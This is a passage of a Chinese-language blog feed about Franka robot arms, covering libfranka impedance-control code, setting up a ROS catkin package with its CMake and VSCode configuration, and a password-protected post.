class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">Eigen::Affine3d <span class="hljs-title">initial_transform</span><span class="hljs-params">(Eigen::Matrix4d::Map(initial_state.O_T_EE.data()))</span></span>;<br><span class="hljs-function">Eigen::Vector3d <span class="hljs-title">position_d</span><span class="hljs-params">(initial_transform.translation())</span></span>;<br><span class="hljs-function">Eigen::Quaterniond <span class="hljs-title">orientation_d</span><span class="hljs-params">(initial_transform.rotation())</span></span>;<br></code></pre></td></tr></table></figure><p>将机械臂的初始位姿转换为Eigen的Affine3d类型，分别提取出位置和四元数表示的姿态。<br />这里需要注意initial_state.O_T_EE.data()，libfranka提供的机械臂状态数据是全部是以列优先的array数组。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">std::function&lt;franka::Torques(<span class="hljs-type">const</span> franka::RobotState&amp;, franka::Duration)&gt;<br>    impedance_control_callback = [&amp;](<span class="hljs-type">const</span> franka::RobotState&amp; robot_state, franka::Duration <span class="hljs-comment">/*duration*/</span>) -&gt; franka::Torques &#123;&#125;<br></code></pre></td></tr></table></figure><p>前面的function是cpp11的函数容器，后面的lambda表达式是函数体。<br />简单说明function的用法，&lt;&gt;中间外层是函数的返回值类型，内层是参数类型（括号内）。<br />lambda表达式的写法是<code>[capture](parameters) -&gt; return_type &#123;body&#125;</code>。<br />其中capture是捕获列表，parameters是参数列表，return_type是返回值类型，body是函数体。<br />capture可以是<code>[]</code>，<code>[&amp;]</code>，<code>[=]</code>，<code>[this]</code>，<code>[&amp;a, b]</code>等。<br /><code>[&amp;]</code>表示引用捕获，<code>[=]</code>表示值捕获，<code>[this]</code>表示捕获当前对象的this指针。<br /><code>-&gt; return_type</code>是返回值类型，可以省略。<br /><code>&#123;body&#125;</code>是函数体，可以省略。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">error.<span class="hljs-built_in">head</span>(<span class="hljs-number">3</span>) &lt;&lt; position - position_d;<br></code></pre></td></tr></table></figure><p>对于位移的误差，直接相减即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// &quot;difference&quot; quaternion</span><br><span class="hljs-keyword">if</span> (orientation_d.<span class="hljs-built_in">coeffs</span>().<span class="hljs-built_in">dot</span>(orientation.<span class="hljs-built_in">coeffs</span>()) &lt; <span class="hljs-number">0.0</span>) &#123;<br>orientation.<span class="hljs-built_in">coeffs</span>() &lt;&lt; -orientation.<span class="hljs-built_in">coeffs</span>();<br>&#125;<br><span class="hljs-comment">// &quot;difference&quot; quaternion</span><br><span class="hljs-function">Eigen::Quaterniond <span class="hljs-title">error_quaternion</span><span class="hljs-params">(orientation.inverse() * orientation_d)</span></span>;<br>error.<span class="hljs-built_in">tail</span>(<span class="hljs-number">3</span>) &lt;&lt; error_quaternion.<span class="hljs-built_in">x</span>(), error_quaternion.<span class="hljs-built_in">y</span>(), error_quaternion.<span class="hljs-built_in">z</span>();<br><span class="hljs-comment">// Transform to base frame</span><br>error.<span class="hljs-built_in">tail</span>(<span class="hljs-number">3</span>) &lt;&lt; -transform.<span class="hljs-built_in">rotation</span>() * error.<span class="hljs-built_in">tail</span>(<span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><p>首先判断两个四元数的点积是否小于0，如果小于0，说明两个四元数的方向相反，需要取反。</p><p>然后通过orientation.inverse() *orientation_d计算姿态误差，这里可以通过旋转矩阵来理解，以<spanclass="math inline">\(^{0}{R}_{c}\)</span>(代表当前姿态)和<spanclass="math inline">\(^{0}{R}_{d}\)</span>(代表目标姿态)举例，都是相对于基坐标系的表示，那么姿态误差可以表示为<spanclass="math inline">\(^{c}{R}_{d} = ^{0}{R}_{c}^{-1} \cdot^{0}{R}_{d}\)</span>，也就是目标姿态相对于当前姿态的表示，四元数应该也是一样（的吧？）。</p><p>最后通过左乘旋转矩阵将姿态误差转换到基坐标系下。</p><p>chatgpt给出了另一种做法：<br /><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">Eigen::AngleAxisd <span class="hljs-title">angle_axis_error</span><span class="hljs-params">(error_quaternion)</span></span>;<br>error.<span class="hljs-built_in">tail</span>(<span class="hljs-number">3</span>) &lt;&lt; angle_axis_error.<span class="hljs-built_in">axis</span>() * angle_axis_error.<span class="hljs-built_in">angle</span>();<br></code></pre></td></tr></table></figure></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">tau_task &lt;&lt; jacobian.<span class="hljs-built_in">transpose</span>() * (-stiffness * error - damping * (jacobian * dq));<br>tau_d &lt;&lt; tau_task + coriolis;<br></code></pre></td></tr></table></figure><p>计算力矩，左乘雅可比矩阵的转置将末端力转换为关节力，然后计算阻抗控制力矩，最后加上科里奥利力。<br />这里的例子没有乘以质量矩阵，大概是为了简化。</p><h1 id="links">3. Links</h1><ul><li><ahref="https://frankaemika.github.io/docs/installation_linux.html">libfranka</a></li><li><ahref="https://frankaemika.github.io/docs/installation_linux.html">franka_ros</a></li><li><ahref="https://frankaemika.github.io/libfranka/0.14.1/examples.html">libfranka_examples</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>franka</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>配置franka</title>
    <link href="/2024/09/12/%E9%85%8D%E7%BD%AEfranka/"/>
    <url>/2024/09/12/%E9%85%8D%E7%BD%AEfranka/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="创建catkin工作空间">0. 创建catkin工作空间</h1><p>创建一个新的catkin工作空间：<br /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p ~/catkin_franka_ws/src<br></code></pre></td></tr></table></figure> 切换到工作空间的src目录：<br /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/catkin_franka_ws/src<br></code></pre></td></tr></table></figure> 初始化工作空间：<br /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">catkin_init_workspace<br></code></pre></td></tr></table></figure> 编译一下：<br /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/catkin_franka_ws<br>catkin_make -j$(<span class="hljs-built_in">nproc</span>)<br></code></pre></td></tr></table></figure></p><h1 id="安装libfranka和franka_ros">1. 安装libfranka和franka_ros</h1><p>根据<ahref="https://frankaemika.github.io/docs/installation_linux.html">官方文档</a>安装libfranka和franka_ros即可。<br />注意选择对应的版本。</p><p>实测在Ubuntu18.04下，可直接使用apt安装ros-melodic-libfranka和ros-melodic-franka-ros。</p><h1 id="创建新项目并配置">2. 创建新项目并配置</h1><h2 id="创建软件包">0. 创建软件包</h2><p>在工作空间的src目录下创建一个新的软件包：<br /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/catkin_franka_ws/src<br>catkin_create_pkg symc_test<br></code></pre></td></tr></table></figure>理论上catkin_create_pkg需要给出软件包的依赖，但是我们可以后面手动在package.xml中添加依赖。</p><h2 id="添加依赖">1. 添加依赖</h2><p>在package.xml中添加依赖：<br /><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">format</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>symc_test<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>The symc_test package<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">maintainer</span> <span class="hljs-attr">email</span>=<span class="hljs-string">&quot;gsymcreg@gmail.com&quot;</span>&gt;</span>symc<span class="hljs-tag">&lt;/<span class="hljs-name">maintainer</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">license</span>&gt;</span>Apache 2.0<span class="hljs-tag">&lt;/<span class="hljs-name">license</span>&gt;</span><br><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">buildtool_depend</span>&gt;</span>catkin<span class="hljs-tag">&lt;/<span class="hljs-name">buildtool_depend</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">build_depend</span>&gt;</span>message_generation<span class="hljs-tag">&lt;/<span class="hljs-name">build_depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">build_depend</span>&gt;</span>eigen<span class="hljs-tag">&lt;/<span class="hljs-name">build_depend</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">build_export_depend</span>&gt;</span>message_runtime<span class="hljs-tag">&lt;/<span class="hljs-name">build_export_depend</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">depend</span>&gt;</span>controller_interface<span class="hljs-tag">&lt;/<span class="hljs-name">depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">depend</span>&gt;</span>dynamic_reconfigure<span class="hljs-tag">&lt;/<span class="hljs-name">depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">depend</span>&gt;</span>eigen_conversions<span class="hljs-tag">&lt;/<span class="hljs-name">depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">depend</span>&gt;</span>franka_hw<span class="hljs-tag">&lt;/<span class="hljs-name">depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">depend</span>&gt;</span>franka_gripper<span class="hljs-tag">&lt;/<span class="hljs-name">depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">depend</span>&gt;</span>geometry_msgs<span class="hljs-tag">&lt;/<span class="hljs-name">depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">depend</span>&gt;</span>hardware_interface<span class="hljs-tag">&lt;/<span class="hljs-name">depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">depend</span>&gt;</span>joint_limits_interface<span class="hljs-tag">&lt;/<span class="hljs-name">depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">depend</span>&gt;</span>tf<span class="hljs-tag">&lt;/<span class="hljs-name">depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">depend</span>&gt;</span>tf_conversions<span class="hljs-tag">&lt;/<span class="hljs-name">depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">depend</span>&gt;</span>libfranka<span class="hljs-tag">&lt;/<span class="hljs-name">depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">depend</span>&gt;</span>pluginlib<span class="hljs-tag">&lt;/<span class="hljs-name">depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">depend</span>&gt;</span>realtime_tools<span class="hljs-tag">&lt;/<span class="hljs-name">depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">depend</span>&gt;</span>roscpp<span class="hljs-tag">&lt;/<span class="hljs-name">depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">depend</span>&gt;</span>urdf<span class="hljs-tag">&lt;/<span class="hljs-name">depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">depend</span>&gt;</span>visualization_msgs<span class="hljs-tag">&lt;/<span class="hljs-name">depend</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">exec_depend</span>&gt;</span>franka_control<span class="hljs-tag">&lt;/<span class="hljs-name">exec_depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">exec_depend</span>&gt;</span>franka_description<span class="hljs-tag">&lt;/<span class="hljs-name">exec_depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">exec_depend</span>&gt;</span>message_runtime<span class="hljs-tag">&lt;/<span class="hljs-name">exec_depend</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">exec_depend</span>&gt;</span>rospy<span class="hljs-tag">&lt;/<span class="hljs-name">exec_depend</span>&gt;</span><br><br><br>  <span class="hljs-comment">&lt;!-- The export tag contains other, unspecified, tags --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">export</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- Other tools can request additional information be placed here --&gt;</span><br><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">export</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure>主要变动是在depend中添加了libfranka和franka_ros的依赖，其他信息是对该软件包的描述。<br />这里build和exec的配置是从franka_ros的package.xml中抄过来的。</p><h2 id="编写cmakelists.txt">2. 编写CMakeLists.txt</h2><p>首先在src目录下创建一个symc_test_node.cpp文件。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/catkin_franka_ws/src/symc_test/src<br><span class="hljs-built_in">touch</span> symc_test_node.cpp<br></code></pre></td></tr></table></figure>然后编辑symc_test目录下的CMakeLists.txt文件： <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">cmake_minimum_required</span>(VERSION <span class="hljs-number">3.0</span>.<span class="hljs-number">2</span>)<br><span class="hljs-keyword">project</span>(symc_test)<br><br><span class="hljs-keyword">find_package</span>(catkin REQUIRED COMPONENTS<br>  controller_interface<br>  dynamic_reconfigure<br>  eigen_conversions<br>  franka_hw<br>  franka_gripper<br>  geometry_msgs<br>  hardware_interface<br>  joint_limits_interface<br>  tf<br>  tf_conversions<br>  message_generation<br>  pluginlib<br>  realtime_tools<br>  urdf<br>  visualization_msgs<br>  roscpp<br>  rospy<br>  std_msgs<br>)<br><br><br><span class="hljs-keyword">find_package</span>(Eigen3 REQUIRED)<br><span class="hljs-keyword">find_package</span>(OsqpEigen REQUIRED)<br><span class="hljs-keyword">find_package</span>(Franka <span class="hljs-number">0.9</span>.<span class="hljs-number">0</span> QUIET)<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">NOT</span> Franka_FOUND)<br>  <span class="hljs-keyword">find_package</span>(Franka <span class="hljs-number">0.8</span>.<span class="hljs-number">0</span> REQUIRED)<br><span class="hljs-keyword">endif</span>()<br><br>list_insert_in_workspace_order(catkin_INCLUDE_DIRS <span class="hljs-variable">$&#123;Franka_INCLUDE_DIRS&#125;</span> <span class="hljs-variable">$&#123;catkin_INCLUDE_DIRS&#125;</span>)<br><br><br><span class="hljs-comment">###################################</span><br><span class="hljs-comment">## catkin specific configuration ##</span><br><span class="hljs-comment">###################################</span><br>catkin_package(<br>  INCLUDE_DIRS <span class="hljs-keyword">include</span><br>  LIBRARIES symc_test<br>  CATKIN_DEPENDS<br>    controller_interface<br>    dynamic_reconfigure<br>    eigen_conversions<br>    franka_hw<br>    franka_gripper<br>    geometry_msgs<br>    hardware_interface<br>    joint_limits_interface<br>    tf<br>    tf_conversions<br>    message_runtime<br>    pluginlib<br>    realtime_tools<br>    roscpp<br>    urdf<br>    visualization_msgs<br>  DEPENDS Franka<br>)<br><br><span class="hljs-comment">###########</span><br><span class="hljs-comment">## Build ##</span><br><span class="hljs-comment">###########</span><br><br><br><span class="hljs-keyword">add_executable</span>(<span class="hljs-variable">$&#123;PROJECT_NAME&#125;</span>_node src/symc_test_node.cpp)<br><br><span class="hljs-keyword">target_include_directories</span>(<span class="hljs-variable">$&#123;PROJECT_NAME&#125;</span>_node PUBLIC<br>  <span class="hljs-variable">$&#123;catkin_INCLUDE_DIRS&#125;</span><br>)<br><span class="hljs-keyword">target_link_libraries</span>(<span class="hljs-variable">$&#123;PROJECT_NAME&#125;</span>_node<br>  <span class="hljs-variable">$&#123;catkin_LIBRARIES&#125;</span><br>  <span class="hljs-variable">$&#123;Franka_LIBRARIES&#125;</span><br>  OsqpEigen::OsqpEigen<br>)<br><br></code></pre></td></tr></table></figure>同样是从franka_ros的CMakeLists.txt中抄过来的，主要是添加了Franka的依赖，但是另外加了OsqpEigen库。<br />要根据实际情况修改CMakeLists.txt中的内容，你也可以根据自己的需求添加其他的依赖。</p><p>这里的OsqpEigen库是用于求解QP问题的库，可以在<ahref="https://github.com/robotology/osqp-eigen">这里</a>找到。</p><h1 id="测试">3.测试</h1><h2 id="编辑symc_testsrcsymc_test_node.cpp文件">0.编辑symc_test/src/symc_test_node.cpp文件：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ros/ros.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;franka/robot.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;OsqpEigen/OsqpEigen.h&quot;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    ros::<span class="hljs-built_in">init</span>(argc, argv, <span class="hljs-string">&quot;symc_test_node&quot;</span>);<br>    <span class="hljs-function">franka::Robot <span class="hljs-title">robot</span><span class="hljs-params">(<span class="hljs-string">&quot;robot_ip&quot;</span>)</span></span>;<br>    OsqpEigen::Solver solver;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Hello, world!&quot;</span> &lt;&lt; std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的robot_ip是franka机器人控制柜的IP地址，官方文档给的示例是172.16.0.2，我们这里只是为了测试环境配置，所以随便写一个IP地址即可。</p><h2 id="编译">1. 编译</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/catkin_franka_ws<br>catkin_make -j$(<span class="hljs-built_in">nproc</span>)<br></code></pre></td></tr></table></figure><h2 id="运行">2. 运行</h2><p>打开一个终端，运行roscore：<br /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">roscore<br></code></pre></td></tr></table></figure> 切换另一个终端，运行symc_test_node：<br /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> ~/catkin_franka_ws/devel/setup.bash<br>rosrun symc_test symc_test_node<br></code></pre></td></tr></table></figure> 其中source~/catkin_franka_ws/devel/setup.bash是为了加载环境变量，rosrun symc_testsymc_test_node是运行symc_test_node节点。<br />symc_test是软件包名，symc_test_node是节点名。</p><p>为了方便，可以将source<sub>/catkin_franka_ws/devel/setup.bash添加到</sub>/.bashrc文件中，这样每次打开终端都会自动加载环境变量。<br /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;source ~/catkin_franka_ws/devel/setup.bash&quot;</span> &gt;&gt; ~/.bashrc<br></code></pre></td></tr></table></figure> 这样就可以直接运行rosrun symc_testsymc_test_node了。<br />上述代码运行时会报错，因为我们没有配置机器人的IP地址，这里只是为了测试环境配置是否成功，只要编译通过就可以了。<br />将franka::Robotrobot("robot_ip");注释掉或者修改为真实franka控制柜的IP地址即可正常运行输出HelloWorld!。</p><h1 id="optional">- Optional</h1><p>如果要用vscode进行开发，可以安装vscode的ros插件，这样可以方便的进行代码补全和调试。</p><p>另外如果不对vscode进行配置代码可能会报错无法找到头文件，也无法补全，我们需要手动配置：</p><p>在.vscode/c_cpp_properties.json中添加所需的头文件路径。<br />这里给出我的配置文件：<br /><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;browse&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;databaseFilename&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;default&#125;&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;limitSymbolsToIncludedHeaders&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;includePath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>          <span class="hljs-string">&quot;/home/symc/catkin_ws/devel/include/**&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-string">&quot;/opt/ros/melodic/include/**&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-string">&quot;/usr/include/**&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-string">&quot;/usr/local/include/**&quot;</span><br>        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ROS&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;intelliSenseMode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;gcc-x64&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;compilerPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/usr/bin/gcc&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;cStandard&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;gnu11&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;cppStandard&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;c++14&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4</span><br>  <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>/home/symc/catkin_ws/devel/include是我们的工作空间的include路径，/opt/ros/melodic/include是ros的include路径，其他的路径是系统的include路径。<br />通过apt安装的libfranka和franka_ros的头文件被安装在了/opt/ros/melodic/include/目录下，如果是源代码安装的则可能在其他目录下。</p><h1 id="links">4. Links</h1><ul><li><ahref="https://frankaemika.github.io/docs/installation_linux.html">libfranka</a></li><li><ahref="https://frankaemika.github.io/docs/installation_linux.html">franka_ros</a></li><li><ahref="https://github.com/robotology/osqp-eigen">osqp-eigen</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>franka</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>impedance control</title>
    <link href="/2024/09/08/impedance-control/"/>
    <url>/2024/09/08/impedance-control/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9db11c8ebc96188606038206d5845b1a16946d5bc094fd614ad1fd7884ee90bc"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>仿真</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>impedance control with visp_ros</title>
    <link href="/2024/09/06/impedance-control-with-visp-ros/"/>
    <url>/2024/09/06/impedance-control-with-visp-ros/</url>
    
